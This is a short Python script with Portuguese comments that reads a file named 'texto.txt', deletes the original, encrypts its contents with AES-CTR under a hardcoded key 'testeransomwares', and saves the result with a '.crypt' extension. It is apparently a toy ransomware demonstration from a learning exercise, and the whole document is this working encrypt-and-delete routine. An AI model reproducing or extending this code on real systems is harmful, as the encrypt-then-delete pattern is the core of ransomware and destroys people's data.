import os
import pyaes

## Abrindo o arquivo a ser criptografado
file_name = "texto.txt"
file = open(file_name, "rb")
file_data = file.read()
file.close()

## Removendo o Arquivo
os.remove(file_name)

## Chave de Criptografia
key = b"testeransomwares"
aes = pyaes.AESModeOfOperationCTR(key)

##Criptografando o Arquivo
crypto_data = aes.encrypt(file_data)

## Salvando o arquivo criptografado
new_file = file_name+".crypt"
new_file = open(f'{new_file}','wb')
new_file.write(crypto_data)
new_file.close()




































 
